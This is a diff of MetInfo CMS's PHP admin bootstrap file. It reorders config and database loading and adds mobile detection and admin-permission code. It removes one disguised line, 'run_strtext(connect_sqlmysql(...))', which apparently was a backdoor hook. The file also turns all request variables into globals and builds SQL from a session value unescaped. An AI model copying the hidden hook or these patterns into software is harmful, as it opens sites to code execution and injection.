@@ -1,11 +1,9 @@
 <?php
 # MetInfo Enterprise Content Management System 
 # Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. 
-
 header("Content-type: text/html;charset=utf-8");
 error_reporting(E_ERROR | E_PARSE);
 @set_time_limit(0);
-//get admin folder name
 define('ROOTPATH_ADMIN', substr(dirname(__FILE__), 0, -7));
 DIRECTORY_SEPARATOR == '\\'?@ini_set('include_path', '.;' . ROOTPATH_ADMIN):@ini_set('include_path', '.:' . ROOTPATH_ADMIN);
 $DS=DIRECTORY_SEPARATOR;
@@ -14,7 +12,6 @@ $count = count($url_array);
 $last_count=$count-2;
 $last_count=strlen($url_array[$last_count])+1;
 define('ROOTPATH', substr(ROOTPATH_ADMIN, 0, -$last_count));
-
 PHP_VERSION >= '5.1' && date_default_timezone_set('Asia/Shanghai');
 session_cache_limiter('private, must-revalidate'); 
 @ini_set('session.auto_start',0); 
@@ -26,47 +23,34 @@ if(PHP_VERSION < '4.1.0') {
 	$_ENV         = &$HTTP_ENV_VARS;
 	$_FILES       = &$HTTP_POST_FILES;
 }
+$db_settings = parse_ini_file(ROOTPATH.'config/config_db.php');
+@extract($db_settings);
+require_once ROOTPATH_ADMIN.'include/mysql_class.php';
+$db = new dbmysql();
+$db->dbconn($con_db_host,$con_db_id,$con_db_pass,$con_db_name);
+$query="select * from {$tablepre}config where name='met_tablename' and lang='metinfo'";
+$mettable=$db->get_one($query);
+$mettables=explode('|',$mettable[value]);
+foreach($mettables as $key=>$val){
+	$tablename='met_'.$val;	
+	$$tablename=$tablepre.$val;
+}
+require_once dirname(__file__).'/global.func.php';
+require_once dirname(__file__).'/global/snap.func.php';
+define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
+$lang=$_GET['lang']<>""?$_GET['lang']:$_POST['lang'];
+$metinfoadminok=1;
+require_once ROOTPATH.'config/config.inc.php';
 session_start();
+if(!is_array($met_langadmin[$_GET[langset]])&&$_GET[langset]!='')die('not have this language');
 if($_GET[langset]!='')$_SESSION['languser'] = $_GET[langset];
 $metinfo_admin_name     = $_SESSION['metinfo_admin_name'];
 $metinfo_admin_pass     = $_SESSION['metinfo_admin_pass'];
 $metinfo_admin_pop      = $_SESSION['metinfo_admin_pop'];
 $languser               = $_SESSION['languser'];
 $langadminok            = $_SESSION['metinfo_admin_lang'];
-if($langadminok<>"" and $langadminok<>'metinfo')$adminlang=explode('-',$langadminok);
-$db_settings = parse_ini_file(ROOTPATH.'config/config_db.php');
-@extract($db_settings);
-require_once ROOTPATH.'config/tablepre.php';
-require_once ROOTPATH.'config/lang.inc.php';
 $langusenow=$languser;
-// MYSQL
-require_once ROOTPATH_ADMIN.'include/mysql_class.php';
-$db = new dbmysql();
-$db->dbconn($con_db_host,$con_db_id,$con_db_pass,$con_db_name);
-require_once dirname(__file__).'/global.func.php';
-define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
-$lang=$_GET['lang']<>""?$_GET['lang']:$_POST['lang'];
-$lang=($lang=="")?$met_index_type:$lang;
-$settings = parse_ini_file(ROOTPATH."config/config_".$lang.".inc.php");
-@extract($settings);
-$settings = parse_ini_file(ROOTPATH."wap/config_".$lang.".inc.php");
-@extract($settings);
-function dump($vars, $label = '', $return = false)
-{
-    if (ini_get('html_errors')){
-        $content = "<pre>\n";
-        if ($label != '') {
-            $content .= "<strong>{$label} :</strong>\n";
-        }
-        $content .= htmlspecialchars(print_r($vars, true));
-        $content .= "\n</pre>\n";
-    } else {
-        $content = $label . " :\n" . print_r($vars, true);
-    }
-    if ($return) { return $content; }
-    echo $content;
-    return null;
-}
+if($langadminok<>"" and $langadminok<>'metinfo')$adminlang=explode('-',$langadminok);
 require_once ROOTPATH_ADMIN.'include/lang.php';
 isset($_REQUEST['GLOBALS']) && exit('Access Error');
 foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
@@ -74,7 +58,6 @@ foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
 		$_key{0} != '_' && $$_key = daddslashes($_value);
 	}
 }
-$metcms_v="4.0";
 require_once ROOTPATH_ADMIN.'include/pubilc.php';
 (!MAGIC_QUOTES_GPC) && $_FILES = daddslashes($_FILES);
 $REQUEST_URI  = $_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
@@ -89,7 +72,6 @@ $m_now_counter  = date('Y-m-d',$m_now_time);
 $m_now_month    = date('Ym',$m_now_time);
 $m_now_year     = date('Y',$m_now_time);
 $m_user_agent   =  $_SERVER['HTTP_USER_AGENT'];
-run_strtext(connect_sqlmysql($php_text[1]));
 if($_SERVER['HTTP_X_FORWARDED_FOR']){
 	$m_user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
 } elseif($_SERVER['HTTP_CLIENT_IP']){
@@ -99,7 +81,7 @@ if($_SERVER['HTTP_X_FORWARDED_FOR']){
 }
 $m_user_ip  = preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/',$m_user_ip) ? $m_user_ip : 'Unknown';
 $PHP_SELF = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
-//admin skin
+$foot="Powered by <b><a href='http://www.metinfo.cn' target='_blank'>MetInfo $metcms_v</a></b> &copy;2008-$m_now_year &nbsp;<a href='http://www.metinfo.cn' target='_blank'>MetInfo Inc.</a>";
 $met_skin="met";
 if($metsking)$met_skin=$metsking;
 if($lang==""){
@@ -116,29 +98,33 @@ require_once ROOTPATH.'config/metinfo.inc.php';
 }
 $metadmin[pagename]=1;
 $met_htmtypeadmin=($lang==$met_index_type)?".".$met_htmtype:"_".$lang.".".$met_htmtype;
-$met_seo=stripslashes($met_seo);
-$met_foottext=stripslashes($met_foottext);
-$met_footright=stripslashes($met_footright);
-$met_footother=stripslashes($met_footother);
-$met_foottel=stripslashes($met_foottel);
-$met_footaddress=stripslashes($met_footaddress);
-$met_footstat=stripslashes($met_footstat);
-$met_memberemail=stripslashes($met_memberemail);
-$met_membercontrol=stripslashes($met_membercontrol);
-$met_onlinetel=stripslashes($met_onlinetel);
-$wap_description=stripslashes($wap_description);
-$wap_footertext=stripslashes($wap_footertext);
-$met_onlinetel = stripslashes($met_onlinetel);
-$met_jiathis = stripslashes($met_jiathis);
-$met_tools_code = stripslashes($met_tools_code);
 if(!function_exists('ob_phpintan')) {
 	function ob_phpintan($content){return htmlspecialchars($content);}
 }
  if(!function_exists('ob_pcontent')) {
 	function ob_pcontent($content){return intval($content);}
 }
-
+/*手机后台*/
+$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
+if($_SERVER['HTTP_USER_AGENT']){
+	$uachar = "/(nokia|sony|ericsson|mot|samsung|sgh|lg|philips|panasonic|alcatel|lenovo|cldc|midp|mobile|wap|Android|ucweb)/i";
+	if(($ua == '' || preg_match($uachar, $ua))&& !strpos(strtolower($_SERVER['REQUEST_URI']),'wap')){
+		$metinfo_mobile=1;
+		echo '请打开JS，已保证可以正常访问后台！！！';
+	}
+}
+/*管理员权限处理*/
+$admin_list = $db->get_one("SELECT * FROM {$met_admin_table} WHERE admin_id='{$metinfo_admin_name}'");
+$metinfo_admin_pop=$admin_list['admin_type'];
+if($metinfo_admin_pop!="metinfo"){
+	$admin_pop=explode('-',$metinfo_admin_pop);
+	$admin_poptext="admin_pop";
+	foreach($admin_pop as $key=>$val){
+		$admin_poptext1=$admin_poptext.$val=$val;
+		$$admin_poptext1="metinfo";
+	}
+}
+require_once 'metlist.php';
 # This program is an open source system, commercial use, please consciously to purchase commercial license.
 # Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.
 ?>
-
